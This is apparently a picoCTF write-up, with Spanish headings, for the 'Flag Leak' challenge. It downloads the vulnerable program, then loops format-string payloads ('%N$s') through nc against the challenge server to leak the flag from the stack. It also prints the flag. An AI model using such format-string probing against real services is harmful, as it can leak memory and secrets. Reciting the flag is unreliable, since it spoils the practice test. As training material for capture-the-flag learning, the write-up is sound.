# Flag Leak

## Descripción
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using: `nc saturn.picoctf.net 60910`
## Pistas

## Solución
```bash
(kali㉿kali)-[~/Documents/binaryExplloitation/flagLeak]
└─$ wget https://artifacts.picoctf.net/c/91/vuln.c
--2023-05-15 12:18:27--  https://artifacts.picoctf.net/c/91/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.22, 13.249.74.69, 13.249.74.56, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.22|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 947 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                    100%[====================================================================================>]     947  --.-KB/s    in 0s      

2023-05-15 12:18:29 (10.6 MB/s) - ‘vuln.c’ saved [947/947]

                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/binaryExplloitation/flagLeak]
└─$ wget https://artifacts.picoctf.net/c/91/vuln  
--2023-05-15 12:18:42--  https://artifacts.picoctf.net/c/91/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.17, 13.249.74.56, 13.249.74.69, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.17|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                      100%[====================================================================================>]  15.50K  --.-KB/s    in 0s      

2023-05-15 12:18:43 (54.4 MB/s) - ‘vuln’ saved [15876/15876]

                                                                                                                                                                       

┌──(kali㉿kali)-[~/Documents/binaryExplloitation/flagLeak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 60910 | grep -Ei (pico|ctf); done
CTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}
```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}

## Notas Adicionales 
comando          descripción

## Referencias